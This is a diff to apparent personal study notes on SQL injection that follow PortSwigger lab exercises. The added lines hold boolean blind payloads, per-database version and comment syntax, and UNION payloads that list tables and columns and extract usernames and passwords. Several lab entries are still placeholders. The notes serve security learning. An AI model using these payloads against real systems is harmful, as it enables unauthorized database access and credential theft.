@@ -61,8 +61,11 @@
 - Retrieve othe records: `' UNION SELECT 1, username, password FROM users --`
 
 **Blind: Boolean-based Injection**  
-- `TBC`
-- 
+- `' AND '1'='1` (Return results)
+- `' AND '1'='2` (No results)
+- `' AND SUBSTRING(@@version, 1, 1)='M'` (Check if the first character is 'M')
+- Automate the payload (Burpsuite Intruder)
+
 **Blind: Time-Base Injection**  
 - `'; WAITFOR DELAY '0:0:10' --`
 
@@ -73,13 +76,13 @@
 - `TBC`
 
 **Examine the specific database**  
-- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
-- Oracle DB version: SELECT banner FROM **v$version**
-- Microsoft, MySQL DB version: SELECT **@@version**
-- PostgreSQL DB version: SELECT **version()**
-- MySQL comment: ' OR 1=1 **#**
-- **All DB except Oracle**: SELECT * FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+- DB version: Microsoft, MySQL: @@version； PostgreSQL： version()；Oracle: SELECT banner FROM **v$version**
+- Comment: Others: --, /* */; MySQL: #
+- **All DB except Oracle**: SELECT TABLE_NAME FROM information_schema.tables, SELECT * FROM information_schema.columns WHERE TABLE_NAME = 'Users'
 - **Oracle**: SELECT * FROM all_tables, SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+- Oracle built-in table: ' UNION SELECT NULL FROM **DUAL**--
+- String concatenation: PostgreSQL, Oracle ||, Microsoft +, MySQL <SPACE>
+- Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
 - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ### Lab
@@ -91,26 +94,33 @@
    - modify the body parameter username=`administrator'--`&password=password
 5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
    - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
-7. SQL injection **UNION** attack, **finding** a **column** containing **text**
+7. SQL injection UNION attack, **finding** a **column** containing **text**
    - GET /filter?category=`' UNION SELECT NULL,'abc',NULL--`
-9. SQL injection **UNION** attack, **retrieving data** from other tables
+9. SQL injection UNION attack, **retrieving data** from other tables
     - GET /filter?category=`' UNION SELECT username, password FROM users--`
 11. SQL injection attack, querying the **database type and version on Oracle**
     - GET /filter?category=`' UNION SELECT BANNER, NULL FROM v$version--`
 13. SQL injection attack, querying the **database type and version on MySQL and Microsoft**
     - GET /filter?category=`' UNION SELECT @@version,'def'#`
-15. Item 8
-16. Item 9
-17. Item 10
-18. Item 11
-19. Item 12
-20. Item 13
-21. Item 14
-22. Item 15
-23. Item 16
-24. Item 17
-25. Item 18
-26. 
+15. SQL injection attack, **listing the database contents on non-Oracle databases**
+    - tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
+    - columns: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`
+    - records: `' UNION SELECT username, password FROM users--`
+17. SQL injection attack, **listing the database contents on Oracle**
+    - tables: `' UNION SELECT table_name,NULL FROM all_tables--`
+    - columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--`
+    - records: `' UNION SELECT USERNAME, PASSWORD FROM USERS--`
+19. SQL injection UNION attack, **retrieving multiple values in a single column**
+    - `' UNION SELECT NULL,username||'~'||password FROM users--`
+21. Item 11
+22. Item 12
+23. Item 13
+24. Item 14
+25. Item 15
+26. Item 16
+27. Item 17
+28. Item 18
+29. 
 
 
 
